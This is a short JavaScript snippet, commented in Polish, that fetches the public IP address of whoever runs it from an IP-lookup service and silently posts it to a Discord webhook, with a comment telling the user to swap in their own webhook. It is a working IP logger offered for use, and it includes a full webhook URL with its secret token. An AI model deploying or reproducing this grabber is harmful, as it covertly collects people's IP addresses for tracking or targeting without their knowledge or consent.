// fetch API do pobrania IP i wysłania na webhook

const webhookUrl = 'https://discord.com/api/webhooks/1437159107910959124/lLFmMH0UNisz0j1P-Mev2Ew7dcBjTmBP2MmsaAParqsAz2PL9x6oxJD1ZS04IpTuh8q_'; // podmień na swój webhook URL

fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;

    fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: `Nowe IP: ${ip}` })
    })
    .catch(e => console.error('Błąd wysyłki webhooka:', e));
  })
  .catch(e => console.error('Błąd pobierania IP:', e));
